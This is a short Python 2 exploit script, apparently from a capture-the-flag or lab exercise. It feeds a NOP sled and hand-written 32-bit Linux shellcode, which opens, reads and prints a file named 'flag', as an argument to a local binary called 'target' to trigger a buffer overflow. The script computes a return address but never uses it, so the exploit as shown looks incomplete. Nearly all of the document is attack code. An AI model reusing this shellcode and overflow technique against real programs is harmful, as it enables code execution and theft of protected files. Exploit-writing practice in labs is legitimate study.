#!/usr/bin/env python2

import os
import struct
import signal
import subprocess as sp

def p32(n):
    return struct.pack("<I", n)

def p64(n):
    return struct.pack("<Q", n)

def bin2sc(pathname):
    shellcode = ""
    for b in open(pathname, "rb").read():
        shellcode += "\\x" + b.encode("hex")
    return shellcode

nopsize = 220
offsize = 20

if __name__ == '__main__':

    assert p32(0x12345678) == b'\x78\x56\x34\x12'
    assert p64(0x12345678) == b'\x78\x56\x34\x12\x00\x00\x00\x00'

    shellcode = '\x90'*nopsize
    shellcode += '\xeb\x39\x5e\x31\xc0\x88\x46\x04\xb0\x05\x89\xf3\x31\xc9\xcd\x80\x85\xc0\x74\x21\x89\xc3\x31\xc0\xb0\x03\x8d\x4e\x05\x31\xd2\x42\xc1\xe2\x1c\xcd\x80\x85\xc0\x74\x0b\x89\xc2\x31\xc0\xb0\x04\x31\xdb\x43\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xc2\xff\xff\xff\x66\x6c\x61\x67'
     #   print(shellcode)
    rt_addr = p32(0xffffcd01)
    print(rt_addr)

    input = shellcode
#    print(input)
    cmds = ["./target",input]
    print(cmds)
    env = os.environ

    p = sp.Popen(cmds, env=env,
                 stdout=sp.PIPE, stdin=sp.PIPE,stderr=sp.PIPE,
                 universal_newlines=False)
    out = p.stdout.read()
    err = p.stderr.read()
    p.wait()

#    os.kill(os.getpid(), signal.SIGUSR1)

    print(out)
    print(err)
    print("Done")